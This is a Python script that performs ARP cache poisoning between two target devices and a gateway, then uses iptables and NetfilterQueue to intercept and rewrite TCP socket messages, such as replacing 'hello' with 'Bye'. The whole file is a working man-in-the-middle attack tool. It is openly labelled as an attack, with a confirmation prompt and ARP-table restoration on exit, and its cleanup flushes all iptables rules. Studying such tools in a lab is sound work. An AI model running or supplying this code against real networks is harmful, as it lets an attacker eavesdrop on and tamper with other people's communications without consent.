#!/usr/bin/env python3
"""
Bidirectional TCP Socket Interceptor
Intercepts and modifies TCP communication between two specific devices
Supports custom message modifications like replacing "hello" with "Bye"
"""

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import re
import logging
from datetime import datetime

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig, DeviceRegistry

# Use configuration values
target_1 = AttackConfig.POISON_TARGET_1  # First device (e.g., laptop)
target_2 = AttackConfig.POISON_TARGET_2  # Second device (e.g., phone)
gateway_device = AttackConfig.GATEWAY_DEVICE
interface = NetworkConfig.INTERFACE

# Socket interception configuration
SOCKET_PORTS = AttackConfig.SOCKET_PORTS
ENABLE_BIDIRECTIONAL_INTERCEPTION = AttackConfig.ENABLE_BIDIRECTIONAL_INTERCEPTION
SOCKET_MODIFICATIONS = AttackConfig.SOCKET_MODIFICATIONS

# Setup detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(PathConfig.TCP_SOCKET_LOG),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def enable_ip_forwarding():
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                logger.info("[SETUP] ✅ IP forwarding enabled successfully")
            else:
                logger.warning("[SETUP] ⚠️ IP forwarding may not be enabled")
    except:
        logger.warning("[SETUP] Could not verify IP forwarding status")

def disable_ip_forwarding():
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def poison_bidirectional(device1, device2, gateway):
    """Poison ARP tables for bidirectional interception between two devices"""
    
    # Method 1: Poison both devices to think the gateway is the attacker
    # Device1 -> thinks gateway is at attacker's MAC
    pkt1 = Ether(dst=device1.mac) / ARP(op=2, pdst=device1.ip, hwdst=device1.mac, 
                                         psrc=gateway.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt1, iface=interface, verbose=0)
    
    # Device2 -> thinks gateway is at attacker's MAC  
    pkt2 = Ether(dst=device2.mac) / ARP(op=2, pdst=device2.ip, hwdst=device2.mac,
                                         psrc=gateway.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt2, iface=interface, verbose=0)
    
    # Method 2: Poison each device to think the other is at attacker's MAC
    # Device1 -> thinks Device2 is at attacker's MAC
    pkt3 = Ether(dst=device1.mac) / ARP(op=2, pdst=device1.ip, hwdst=device1.mac,
                                         psrc=device2.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt3, iface=interface, verbose=0)
    
    # Device2 -> thinks Device1 is at attacker's MAC
    pkt4 = Ether(dst=device2.mac) / ARP(op=2, pdst=device2.ip, hwdst=device2.mac,
                                         psrc=device1.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt4, iface=interface, verbose=0)
    
    # Gateway poisoning for routing
    # Gateway -> thinks Device1 is at attacker's MAC
    pkt5 = Ether(dst=gateway.mac) / ARP(op=2, pdst=gateway.ip, hwdst=gateway.mac,
                                         psrc=device1.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt5, iface=interface, verbose=0)
    
    # Gateway -> thinks Device2 is at attacker's MAC
    pkt6 = Ether(dst=gateway.mac) / ARP(op=2, pdst=gateway.ip, hwdst=gateway.mac,
                                         psrc=device2.ip, hwsrc=get_if_hwaddr(interface))
    sendp(pkt6, iface=interface, verbose=0)
    
    logger.debug(f"[ARP-POISON] Bidirectional poisoning: {device1.name} <-> {device2.name}")

def restore_arp_tables(device1, device2, gateway):
    """Restore correct ARP entries for all devices"""
    
    # Restore Device1's knowledge of Device2 and Gateway
    pkt1 = Ether(dst=device1.mac) / ARP(op=2, pdst=device1.ip, hwdst=device1.mac,
                                         psrc=device2.ip, hwsrc=device2.mac)
    sendp(pkt1, iface=interface, verbose=0, count=3)
    
    pkt2 = Ether(dst=device1.mac) / ARP(op=2, pdst=device1.ip, hwdst=device1.mac,
                                         psrc=gateway.ip, hwsrc=gateway.mac)
    sendp(pkt2, iface=interface, verbose=0, count=3)
    
    # Restore Device2's knowledge of Device1 and Gateway
    pkt3 = Ether(dst=device2.mac) / ARP(op=2, pdst=device2.ip, hwdst=device2.mac,
                                         psrc=device1.ip, hwsrc=device1.mac)
    sendp(pkt3, iface=interface, verbose=0, count=3)
    
    pkt4 = Ether(dst=device2.mac) / ARP(op=2, pdst=device2.ip, hwdst=device2.mac,
                                         psrc=gateway.ip, hwsrc=gateway.mac)
    sendp(pkt4, iface=interface, verbose=0, count=3)
    
    # Restore Gateway's knowledge of both devices
    pkt5 = Ether(dst=gateway.mac) / ARP(op=2, pdst=gateway.ip, hwdst=gateway.mac,
                                         psrc=device1.ip, hwsrc=device1.mac)
    sendp(pkt5, iface=interface, verbose=0, count=3)
    
    pkt6 = Ether(dst=gateway.mac) / ARP(op=2, pdst=gateway.ip, hwdst=gateway.mac,
                                         psrc=device2.ip, hwsrc=device2.mac)
    sendp(pkt6, iface=interface, verbose=0, count=3)
    
    logger.info(f"[ARP-RESTORE] Restored ARP tables for {device1.name}, {device2.name}, and {gateway.name}")

def modify_bidirectional_packet(packet):
    """Main packet modification function for bidirectional TCP socket traffic"""
    scapy_pkt = IP(packet.get_payload())
    
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    
    # Only process TCP packets with payload
    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
        packet.accept()
        return

    tcp_layer = scapy_pkt[TCP]
    payload = scapy_pkt[Raw].load
    
    # Check if this traffic involves our target devices (bidirectional)
    is_target_traffic = (
        # Target1 -> Target2
        (src_ip == target_1.ip and dst_ip == target_2.ip) or
        # Target2 -> Target1  
        (src_ip == target_2.ip and dst_ip == target_1.ip) or
        # Via gateway routing
        (src_ip == target_1.ip and dst_ip == gateway_device.ip) or
        (src_ip == target_2.ip and dst_ip == gateway_device.ip) or
        (src_ip == gateway_device.ip and dst_ip == target_1.ip) or
        (src_ip == gateway_device.ip and dst_ip == target_2.ip)
    )
    
    if not is_target_traffic:
        packet.accept()
        return
    
    # Check if this is traffic on our target socket ports
    is_target_port = (tcp_layer.dport in SOCKET_PORTS or tcp_layer.sport in SOCKET_PORTS)
    
    if not is_target_port:
        packet.accept()
        return
    
    # Determine communication direction
    direction = "Unknown"
    if src_ip == target_1.ip and dst_ip == target_2.ip:
        direction = f"{target_1.name} → {target_2.name}"
    elif src_ip == target_2.ip and dst_ip == target_1.ip:
        direction = f"{target_2.name} → {target_1.name}"
    elif src_ip == target_1.ip:
        direction = f"{target_1.name} → Gateway"
    elif src_ip == target_2.ip:
        direction = f"{target_2.name} → Gateway"
    elif dst_ip == target_1.ip:
        direction = f"Gateway → {target_1.name}"
    elif dst_ip == target_2.ip:
        direction = f"Gateway → {target_2.name}"
        
    # Log all socket traffic
    logger.info(f"[SOCKET-TRAFFIC] 🎯 {direction} | {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
    
    try:
        # Try to decode the payload as text
        message = payload.decode('utf-8', errors='ignore')
        
        if message.strip():
            logger.warning(f"[SOCKET-MESSAGE] 📨 {direction} | Intercepted: '{message.strip()}'")
            logger.info(f"[SOCKET-DEBUG] Original packet size: {len(payload)} bytes")
            
            if ENABLE_BIDIRECTIONAL_INTERCEPTION:
                # Modify the message using configured modifications
                modified_message = modify_socket_message(message, direction)
                
                if modified_message != message:
                    logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Original: '{message.strip()}'")
                    logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Modified: '{modified_message.strip()}'")
                    
                    # Handle payload size changes - maintain original size for TCP stability
                    modified_payload = pad_to_original_size(modified_message.encode('utf-8'), len(payload))
                    logger.info(f"[SOCKET-DEBUG] Modified packet size: {len(modified_payload)} bytes (preserved original: {len(payload)} bytes)")
                    
                    # Update packet with modified payload
                    scapy_pkt[Raw].load = modified_payload
                    
                    # Recalculate checksums (length stays the same)
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[TCP].chksum
                    
                    packet.set_payload(bytes(scapy_pkt))
                    logger.info(f"[SOCKET-MODIFY] ✅ {direction} | Message successfully modified!")
                else:
                    logger.info(f"[SOCKET-MODIFY] ⏸️ {direction} | No modifications applied")
            
    except UnicodeDecodeError:
        # Handle binary data
        logger.info(f"[SOCKET-BINARY] 📦 {direction} | Binary data: {len(payload)} bytes")
        
    packet.accept()

def pad_to_original_size(modified_payload, original_size):
    """Preserve original packet size to maintain TCP sequence numbers"""
    if len(modified_payload) == original_size:
        return modified_payload
    elif len(modified_payload) < original_size:
        # Pad with spaces to maintain the same size
        padding_needed = original_size - len(modified_payload)
        return modified_payload + b' ' * padding_needed
    else:
        # Must truncate to preserve TCP sequence numbers
        logger.warning(f"[SOCKET-DEBUG] Modified payload larger than original, truncating to preserve TCP flow")
        return modified_payload[:original_size]

def modify_socket_message(original_message, direction):
    """Modify socket messages using configured replacements with size preservation"""
    message = original_message
    original_length = len(original_message)
    was_modified = False
    
    # Apply modifications from config with size checking
    for original_word, replacement in SOCKET_MODIFICATIONS.items():
        if original_word.lower() in message.lower():
            # Try the replacement from config
            test_message = re.sub(re.escape(original_word), replacement, message, flags=re.IGNORECASE)
            
            # If it fits, use it. If not, truncate the replacement to fit
            if len(test_message) <= original_length:
                message = test_message
                was_modified = True
            else:
                # Calculate how much space we have for the replacement
                space_available = original_length - (len(message) - len(original_word))
                if space_available > 0:
                    # Truncate replacement to fit available space
                    truncated_replacement = replacement[:space_available]
                    message = re.sub(re.escape(original_word), truncated_replacement, message, flags=re.IGNORECASE)
                    was_modified = True
                    logger.info(f"[SOCKET-DEBUG] Truncated '{replacement}' to '{truncated_replacement}' to fit packet size")
    
    # Pad to exact original size if modified
    if was_modified and len(message) < original_length:
        padding_needed = original_length - len(message)
        message = message + " " * padding_needed
    
    return message

def start_bidirectional_interception():
    """Start the bidirectional TCP socket interception system"""
    logger.info("[SETUP] Setting up iptables rule for bidirectional packet interception")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    
    # Verify iptables rule was added
    import subprocess
    try:
        result = subprocess.run(['iptables', '-L', 'FORWARD', '-n'], capture_output=True, text=True)
        if 'NFQUEUE' in result.stdout:
            logger.info("[SETUP] ✅ iptables NFQUEUE rule successfully added")
        else:
            logger.warning("[SETUP] ⚠️ iptables rule may not have been added correctly")
    except:
        logger.warning("[SETUP] Could not verify iptables rule")
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, modify_bidirectional_packet)
    
    logger.info("[MITM] 🚀 Bidirectional TCP Socket interception system started")
    logger.info("[MITM] 📡 Monitoring socket traffic on ports: " + str(SOCKET_PORTS))
    logger.info(f"[MITM] 🎯 Target 1: {target_1}")
    logger.info(f"[MITM] 🎯 Target 2: {target_2}")
    logger.info(f"[MITM] 🌐 Gateway: {gateway_device}")
    logger.info(f"[MITM] 🔧 Bidirectional: {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
    logger.info(f"[MITM] 🔀 Modifications: {SOCKET_MODIFICATIONS}")
    logger.info("[MITM] 💡 Compact modifications preserve TCP packet sizes")
    logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[MITM] 🛑 Stopping bidirectional interceptor...")
    finally:
        nfqueue.unbind()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")

def display_configuration():
    """Display current attack configuration"""
    print("=" * 70)
    print("🎯 BIDIRECTIONAL TCP SOCKET INTERCEPTION CONFIGURATION")
    print("=" * 70)
    print(f"Interface:              {interface}")
    print(f"Target Device 1:        {target_1}")
    print(f"Target Device 2:        {target_2}")
    print(f"Gateway Device:         {gateway_device}")
    print(f"Socket Ports:           {SOCKET_PORTS}")
    print(f"Bidirectional Mode:     {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
    print(f"Message Modifications:  {SOCKET_MODIFICATIONS}")
    print("=" * 70)
    print("📋 Communication Patterns:")
    print(f"  • {target_1.name} ↔ {target_2.name} (Direct)")
    print(f"  • {target_1.name} → Gateway → {target_2.name} (Routed)")
    print(f"  • {target_2.name} → Gateway → {target_1.name} (Routed)")
    print("=" * 70)
    print("🔧 TCP Packet Handling:")
    print("  • Uses configured replacements with size preservation")
    print(f"  • Current modifications: {SOCKET_MODIFICATIONS}")
    print("  • Replacements truncated if needed to fit packet size")
    print("=" * 70)
    
    if SecurityConfig.REQUIRE_CONFIRMATION:
        response = input("🤔 Proceed with bidirectional socket interception? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("❌ Attack cancelled by user")
            sys.exit(0)

def main():
    """Main function"""
    display_configuration()
    
    logger.info("[ATTACK] 🚀 Starting bidirectional ARP poisoning & TCP socket interception")
    logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
    
    enable_ip_forwarding()

    def exit_gracefully(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Starting cleanup process...")
        logger.info("[CLEANUP] Restoring ARP tables...")
        
        # Restore ARP tables for all devices
        restore_arp_tables(target_1, target_2, gateway_device)
        
        disable_ip_forwarding()
        logger.info("[CLEANUP] Removing iptables rules...")
        os.system("iptables -F")
        logger.info("[CLEANUP] ✅ Cleanup complete")
        sys.exit(0)

    signal.signal(signal.SIGINT, exit_gracefully)

    # Start bidirectional ARP poisoning in background
    def poison_loop():
        logger.info("[ARP-POISON] 🎯 Starting continuous bidirectional ARP poisoning")
        logger.info(f"[ARP-POISON] Interval: {AttackConfig.ARP_POISON_INTERVAL} seconds")
        logger.info(f"[ARP-POISON] Targets: {target_1.name} ↔ {target_2.name}")
        
        poison_count = 0
        while True:
            # Perform bidirectional poisoning
            poison_bidirectional(target_1, target_2, gateway_device)
            
            poison_count += 6  # 6 ARP packets per round
            if poison_count % 30 == 0:  # Log every 5 rounds (30 packets)
                logger.info(f"[ARP-POISON] Sent {poison_count} poison packets")
            
            time.sleep(AttackConfig.ARP_POISON_INTERVAL)

    from threading import Thread
    poison_thread = Thread(target=poison_loop, daemon=True)
    poison_thread.start()
    
    # Start bidirectional socket packet interception
    start_bidirectional_interception()

if __name__ == "__main__":
    main() 